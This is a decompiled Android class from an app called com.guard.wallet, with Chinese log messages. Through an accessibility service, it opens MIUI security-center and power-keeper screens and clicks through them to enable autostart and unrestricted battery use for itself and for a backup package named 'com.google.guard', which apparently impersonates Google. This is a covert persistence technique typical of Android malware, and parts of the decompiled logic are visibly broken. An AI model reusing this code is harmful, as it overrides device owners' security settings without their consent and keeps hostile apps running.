package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p014r.EnumC0892e;
import p022z.C0981d;

/* renamed from: o.q */
/* loaded from: classes.dex */
public final class C0428q extends AbstractC0414c {

    /* renamed from: z */
    public static final /* synthetic */ int f945z = 0;

    /* renamed from: r */
    public final AtomicReference f946r;

    /* renamed from: s */
    public final AtomicBoolean f947s;

    /* renamed from: t */
    public final AtomicBoolean f948t;

    /* renamed from: u */
    public final AtomicBoolean f949u;

    /* renamed from: v */
    public final AtomicBoolean f950v;

    /* renamed from: w */
    public final AtomicBoolean f951w;

    /* renamed from: x */
    public final AtomicBoolean f952x;

    /* renamed from: y */
    public final AtomicBoolean f953y;

    public C0428q() {
        super(l0(), "com.miui.securitycenter");
        this.f946r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        int i2 = 0;
        this.f947s = new AtomicBoolean(false);
        this.f948t = new AtomicBoolean(false);
        this.f949u = new AtomicBoolean(true);
        this.f950v = new AtomicBoolean(true);
        this.f951w = new AtomicBoolean(false);
        this.f952x = new AtomicBoolean(false);
        new AtomicBoolean(false);
        new AtomicBoolean(false);
        this.f953y = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new RunnableC0427p(this, i2), 100L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    public static CombineFilter b0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("MIUI_APP_POWER_CONSUME_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter d0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow e0() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static LinkedList l0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(e0());
        ListenWindow listenWindow = new ListenWindow("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
        AbstractC0413b.m1024r(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);
        linkedList.add(n0(AbstractC0251g.x0()));
        linkedList.add(n0(AbstractC0251g.m658e()));
        linkedList.add(o0(AbstractC0251g.x0()));
        linkedList.add(o0(AbstractC0251g.m658e()));
        linkedList.add(m0(AbstractC0251g.x0()));
        linkedList.add(m0(AbstractC0251g.m658e()));
        linkedList.add(q0());
        linkedList.add(p0());
        ListenWindow listenWindow2 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);
        ListenWindow listenWindow3 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.settings.OtherPermissionsActivity");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);
        ListenWindow listenWindow4 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionAppsModifyActivity");
        listenWindow4.setEventTypes(new HashSet<>());
        listenWindow4.getEventTypes().add(32);
        listenWindow4.getEventTypes().add(16384);
        linkedList.add(listenWindow4);
        ListenWindow listenWindow5 = new ListenWindow("com.miui.powerkeeper", "miuix.appcompat.app.AlertDialog");
        listenWindow5.setEventTypes(new HashSet<>());
        listenWindow5.getEventTypes().add(32);
        listenWindow5.getEventTypes().add(16384);
        linkedList.add(listenWindow5);
        ListenWindow listenWindow6 = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
        listenWindow6.setEventTypes(new HashSet<>());
        listenWindow6.getEventTypes().add(32);
        listenWindow6.getEventTypes().add(16384);
        linkedList.add(listenWindow6);
        return linkedList;
    }

    public static ListenWindow m0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow n0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.appmanager.ApplicationsDetailsActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow o0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.appmanager.AppManagerMainActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow p0() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.powercenter.legacypowerrank.PowerDetailActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow q0() {
        ListenWindow listenWindow = new ListenWindow("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.q", "准备结束本地保活自动化引擎");
                    AbstractC0184g.m354h(100);
                    m1050X();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    AtomicReference atomicReference = this.f946r;
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP)) {
                        s0(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_BACKUP_APP)) {
                        s0("com.google.guard");
                    }
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    AbstractC0184g.m349c();
                    Log.d("o.q", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.q", e2);
            }
            reentrantLock.unlock();
        }
    }

    public final void c0() {
        UiObject findOneByCombine;
        String str;
        try {
            AbstractC0184g.m354h(10);
            UiObject m1047Q = m1047Q();
            if (m1047Q != null) {
                m1047Q.scrollForwardEnd();
                m1047Q.refresh();
                findOneByCombine = m1047Q.scrollBackwardUtil(new C0981d(d0(), 0));
                if (findOneByCombine == null) {
                    findOneByCombine = m1047Q.scrollForwardUtil(new C0981d(b0(), 0));
                }
            } else {
                findOneByCombine = m1072k().findOneByCombine(d0());
                if (findOneByCombine == null) {
                    findOneByCombine = m1072k().findOneByCombine(b0());
                }
            }
            if (findOneByCombine != null) {
                Log.d("o.q", "耗电策略查找成功:" + findOneByCombine);
                AbstractC0184g.m354h(20);
                UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(AbstractC0414c.m1037L());
                if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                    Log.d("o.q", "已点击电量消耗、耗电策略栏目:" + findParentUtilCombine);
                    AbstractC0184g.m354h(30);
                    for (int i2 = 0; !g0() && i2 < 20; i2++) {
                        Log.d("o.q", "正在查找电量消耗、耗电策略窗口");
                        AbstractC0251g.T0(2);
                    }
                    k0();
                    return;
                }
                str = "查找并点击耗电策略栏目失败";
            } else {
                str = "耗电策略、电量栏目查找失败";
            }
            Log.e("o.q", str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    public final boolean f0() {
        try {
            String x02 = Objects.equals(this.f946r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? AbstractC0251g.x0() : AbstractC0251g.m658e();
            LinkedList linkedList = new LinkedList();
            linkedList.add(n0(x02));
            linkedList.add(o0(x02));
            linkedList.add(m0(x02));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.q", "已进入App详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
            return false;
        }
    }

    public final boolean g0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(q0());
            linkedList.add(p0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.q", "已进入App省电策略窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
            return false;
        }
    }

    public final boolean h0() {
        try {
            if (!m1078q(Collections.singletonList(e0()))) {
                return false;
            }
            Log.d("o.q", "已进入自启动管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
            return false;
        }
    }

    public final boolean i0(String str) {
        UiObject findOneByCombine;
        String str2;
        try {
            UiObject m1047Q = m1047Q();
            if (m1047Q == null) {
                r0();
                m1047Q = m1047Q();
            }
            if (m1047Q != null) {
                Log.d("o.q", "自启动管理滚动视图查找成功");
                C0981d c0981d = new C0981d(AbstractC0414c.m1033H(str), 0);
                findOneByCombine = m1047Q.scrollForwardUtil(c0981d);
                if (findOneByCombine == null) {
                    findOneByCombine = m1047Q.scrollBackwardUtil(c0981d);
                }
            } else {
                Log.e("o.q", "自启动管理滚动视图查找失败");
                findOneByCombine = m1072k().findOneByCombine(AbstractC0414c.m1033H(str));
            }
            if (findOneByCombine != null) {
                UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(AbstractC0414c.m1037L());
                if (findParentUtilCombine != null) {
                    Log.d("o.q", "自启动栏目查找成功");
                    CheckedResult m1046O = m1046O(findParentUtilCombine, 5);
                    str2 = (m1046O.isClicked() || m1046O.isChecked()) ? "自启动栏目查找失败" : "未勾选App自启动";
                    Log.d("o.q", "已点击，已勾选App自启动");
                    return true;
                }
                Log.e("o.q", str2);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
        return false;
    }

    public final void j0() {
        AtomicBoolean atomicBoolean = this.f953y;
        try {
            atomicBoolean.set(true);
            AbstractC0026q.m172b();
            AtomicReference atomicReference = this.f946r;
            boolean equals = Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP);
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_BACKUP_APP;
            if (!equals) {
                if (Objects.equals(atomicReference.get(), enumC0892e)) {
                    if (this.f948t.get() || AbstractC0251g.d0("com.google.guard") == null) {
                        s0("com.google.guard");
                        concurrentLinkedQueue.clear();
                        mo1051Z();
                        return;
                    } else {
                        atomicBoolean.set(false);
                        AbstractC0251g.d1("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                        Log.d("o.q", "启动MIUI自启动管理");
                        return;
                    }
                }
                return;
            }
            if (!this.f947s.get()) {
                atomicBoolean.set(false);
                AbstractC0251g.d1("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                Log.d("o.q", "启动MIUI自启动管理");
                return;
            }
            s0(MainApplication.getAppContext().getPackageName());
            concurrentLinkedQueue.clear();
            if (AbstractC0252h.m714r("com.google.guard") || AbstractC0251g.d0("com.google.guard") == null) {
                mo1051Z();
                return;
            }
            atomicBoolean.set(false);
            atomicReference.set(enumC0892e);
            AbstractC0251g.Z0("com.google.guard");
            Log.d("o.q", "已启动 ".concat("com.google.guard").concat(" 应用详情"));
            "已启动 ".concat("com.google.guard").concat(" 应用详情");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:22:0x0108 A[Catch: Exception -> 0x0126, TryCatch #0 {Exception -> 0x0126, blocks: (B:3:0x0004, B:5:0x000b, B:7:0x0088, B:9:0x009d, B:11:0x00b1, B:13:0x00b8, B:15:0x00c9, B:16:0x00cd, B:18:0x00d5, B:19:0x00f5, B:20:0x00fa, B:22:0x0108, B:23:0x010d, B:24:0x010b, B:25:0x00d9, B:27:0x00ea, B:29:0x00f0, B:30:0x0110, B:31:0x00a2, B:32:0x0117, B:34:0x011d), top: B:2:0x0004 }] */
    /* JADX WARN: Removed duplicated region for block: B:24:0x010b A[Catch: Exception -> 0x0126, TryCatch #0 {Exception -> 0x0126, blocks: (B:3:0x0004, B:5:0x000b, B:7:0x0088, B:9:0x009d, B:11:0x00b1, B:13:0x00b8, B:15:0x00c9, B:16:0x00cd, B:18:0x00d5, B:19:0x00f5, B:20:0x00fa, B:22:0x0108, B:23:0x010d, B:24:0x010b, B:25:0x00d9, B:27:0x00ea, B:29:0x00f0, B:30:0x0110, B:31:0x00a2, B:32:0x0117, B:34:0x011d), top: B:2:0x0004 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void k0() {
        UiObject findOneByOperateOr;
        try {
            if (g0()) {
                Log.d("o.q", "keepAliveInAppPowerStrategy 窗口匹配");
                AbstractC0184g.m354h(40);
                m1062G();
                Log.d("o.q", "active root complete");
                UiObject m1047Q = m1047Q();
                CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
                combineFiltersWithOr.setFilters(new LinkedList());
                List<CombineFilter> filters = combineFiltersWithOr.getFilters();
                CombineFilter combineFilter = new CombineFilter();
                combineFilter.setStringConditions(new LinkedList());
                StringCondition stringCondition = new StringCondition();
                stringCondition.setProperty(TextBundle.TEXT_ENTRY);
                stringCondition.setEquals(AbstractC0250f.m627b("MIUI_SETTINGS_UNRESTRICTED_TEXT"));
                combineFilter.getStringConditions().add(stringCondition);
                filters.add(combineFilter);
                List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
                CombineFilter combineFilter2 = new CombineFilter();
                combineFilter2.setStringConditions(new LinkedList());
                StringCondition stringCondition2 = new StringCondition();
                stringCondition2.setProperty("desc");
                stringCondition2.setEquals(AbstractC0250f.m627b("MIUI_SETTINGS_UNRESTRICTED_TEXT"));
                combineFilter2.getStringConditions().add(stringCondition2);
                filters2.add(combineFilter2);
                if (m1047Q != null) {
                    Log.d("o.q", "耗电策略窗口滚动视图查找成功");
                    AbstractC0184g.m354h(50);
                    C0981d c0981d = new C0981d(combineFiltersWithOr, 1);
                    findOneByOperateOr = m1047Q.scrollForwardUtil(c0981d);
                    if (findOneByOperateOr == null) {
                        findOneByOperateOr = m1047Q.scrollForwardUtil(c0981d);
                    }
                } else {
                    Log.e("o.q", "耗电策略窗口滚动视图查找失败");
                    findOneByOperateOr = m1072k().findOneByOperateOr(combineFiltersWithOr);
                }
                if (findOneByOperateOr == null) {
                    Log.e("o.q", "没有找到不采取任何限制措施");
                }
                if (findOneByOperateOr != null) {
                    AbstractC0184g.m354h(60);
                    if ("android.widget.RadioButton".equals(AbstractC0026q.m151B(findOneByOperateOr.className()) ? "android.widget.TextView" : findOneByOperateOr.className())) {
                        findOneByOperateOr.click();
                    } else {
                        findOneByOperateOr.click();
                        AbstractC0251g.T0(5);
                        UiObject findParentUtilCombine = findOneByOperateOr.findParentUtilCombine(AbstractC0414c.m1037L());
                        if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                            Log.d("o.q", "已勾选无限制,不采取任何限制措施");
                        }
                        (!Objects.equals(this.f946r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? this.f951w : this.f952x).set(true);
                    }
                    AbstractC0184g.m354h(70);
                    (!Objects.equals(this.f946r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? this.f951w : this.f952x).set(true);
                }
                this.f850n.remove("startIgnoringBatteryOptimizations");
            }
            if (g0()) {
                AbstractC0251g.F0(1);
                AbstractC0251g.T0(10);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    public final void r0() {
        try {
            Log.d("o.q", String.valueOf(AbstractC0249e.m616e().getNavigationBarHeight()));
            if (AbstractC0251g.m646S(10L, 1000L, new Point(r1.getWidth().intValue() / 2.0f, (r1.getHeight().intValue() - r1.getNavigationBarHeight().intValue()) - 100), new Point(r1.getWidth().intValue() / 2.0f, r1.getStatusBarHeight().intValue()))) {
                AbstractC0251g.T0(10);
                MyAccessibilityService.m548I(m1072k());
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    public final void s0(String str) {
        String str2;
        try {
            if (Objects.equals(str, "com.google.guard")) {
                PowerControlStateVO m707k = AbstractC0252h.m707k(str);
                m707k.setPackageName(str);
                AtomicBoolean atomicBoolean = this.f952x;
                if (atomicBoolean.get()) {
                    m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean.get()));
                }
                AtomicBoolean atomicBoolean2 = this.f948t;
                if (atomicBoolean2.get()) {
                    m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean2.get()));
                }
                AtomicBoolean atomicBoolean3 = this.f950v;
                if (atomicBoolean3.get()) {
                    m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean3.get()));
                }
                m707k.setRetryCount(m707k.getRetryCount() + 1);
                AbstractC0252h.m691L(m707k);
                str2 = "已保存备用进程保活策略";
            } else {
                PowerControlStateVO m707k2 = AbstractC0252h.m707k(str);
                m707k2.setPackageName(str);
                AtomicBoolean atomicBoolean4 = this.f951w;
                if (atomicBoolean4.get()) {
                    m707k2.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean4.get()));
                }
                AtomicBoolean atomicBoolean5 = this.f947s;
                if (atomicBoolean5.get()) {
                    m707k2.setAllowAutoStart(Boolean.valueOf(atomicBoolean5.get()));
                }
                AtomicBoolean atomicBoolean6 = this.f949u;
                if (atomicBoolean6.get()) {
                    m707k2.setAllowRelateStart(Boolean.valueOf(atomicBoolean6.get()));
                }
                m707k2.setRetryCount(m707k2.getRetryCount() + 1);
                AbstractC0252h.m691L(m707k2);
                str2 = "已保存主进程保活策略";
            }
            Log.d("o.q", str2);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            if (this.f953y.get()) {
                return;
            }
            boolean f02 = f0();
            String str3 = this.f864c;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (f02) {
                concurrentLinkedQueue.remove("keepAliveInAutoStartManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissions");
                concurrentLinkedQueue.remove("keepAliveInOtherPermissions");
                concurrentLinkedQueue.remove("keepAliveInPermissionModify");
                if (!concurrentLinkedQueue.contains("keepAliveInAppDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppDetail");
                    AbstractC0243l.m593c(new RunnableC0427p(this, 1), str3);
                }
            }
            if (h0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissions");
                concurrentLinkedQueue.remove("keepAliveInOtherPermissions");
                concurrentLinkedQueue.remove("keepAliveInPermissionModify");
                if (concurrentLinkedQueue.contains("keepAliveInAutoStartManage")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInAutoStartManage");
                AbstractC0243l.m593c(new RunnableC0427p(this, 2), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.q", e2);
        }
    }
}
